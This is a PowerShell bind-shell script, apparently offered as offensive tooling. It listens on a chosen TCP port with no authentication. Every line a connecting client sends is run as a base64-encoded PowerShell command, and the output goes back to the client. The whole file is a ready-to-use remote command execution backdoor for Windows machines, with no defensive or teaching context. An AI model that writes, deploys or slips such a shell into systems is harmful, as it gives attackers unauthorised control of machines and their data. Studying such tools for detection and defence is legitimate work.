<#
.AUTHOR
0x10F8

.SYNOPSIS
Allows a device running powershell capable windows to bind to a specified port. Clients which 
connect to this port can send commands which will be executed on the device and the response
sent back to the client (bind shell).

.EXAMPLE
Bind to the specific port
PS C:\> .\bind_tcp.ps1 -p 9001
If you want to debug the script the verbose option will output a lot of info during running
#>

# Read the required parameters
Param (
    [Parameter(Mandatory = $true)]    [int]       [ValidateNotNullOrEmpty()]  [Alias('p')]  $port
)

$WAIT_MS = 500 # Time (ms) to wait between reads from the tcp socket

function Get-Connection-State([System.Net.Sockets.TcpClient] $connection) {
    <#
    .Description
    Gets the connection state for the TcpClient object given. 
    The response will be a System.Net.NetworkInformation.TCPState object
    #> 
    $connection_props = [System.Net.NetworkInformation.IPGlobalProperties]::
    GetIPGlobalProperties().GetActiveTcpConnections().Where( {
            $_.LocalEndPoint -eq $connection.Client.LocalEndPoint -and $_.RemoteEndPoint -eq $connection.Client.RemoteEndPoint
        })
    return $connection_props.State
}
function Invoke-Cmd([string] $command) {
    <#
    .Description
    Invokes the command given and returns the response as a string
    #> 
    $response = ""
    if ($command) {
        Write-Verbose "Recieved command: $command"
        try {
            # Encode the command as base64 and send to powershell
            # This seems to solve some issues around formatting and escaping
            $commandbytes = [System.Text.Encoding]::Unicode.GetBytes($command)
            $base64command = [System.Convert]::ToBase64String($commandbytes)
            $response = &powershell.exe -EncodedCommand "$base64command" 2>&1 | Out-String
        }
        catch {
            $response = $error[0]
        }
        Write-Verbose "The response: $response"
    }
    return $response
}



# Create the TCP listener on specified port
$endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port)
$listener = New-Object System.Net.Sockets.TcpListener($endpoint)
$listener.start()

Write-Verbose "Listening on port $port"

# Wait for client connection
$connection = $listener.AcceptTcpClient()
$stream = $connection.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

$client_addr = $connection.Client.RemoteEndPoint.ToString()
Write-Verbose "Client connected: $client_addr"

# Start read/write loop
$connected = $true
while ($connected) {
    
    # Read command
    if ($stream.DataAvailable) {
        $request = $reader.ReadLine()
    }

    # Handle command
    $response = Invoke-Cmd $request

    if ($response) {
        $writer.Write($response)
    }

    # Check if the remote server disconnected
    $connection_state = Get-Connection-State $connection
    $connected = ($connection_state -eq [System.Net.NetworkInformation.TCPState]::Established)

    # Reset request/response vars
    $request = ""
    $response = ""

    # Wait a short time before the next read/write loop
    start-sleep -Milliseconds $WAIT_MS
}

# Disconnect
Write-Verbose "Client disconnected"
$reader.Close()
$writer.Close()
$connection.Close()
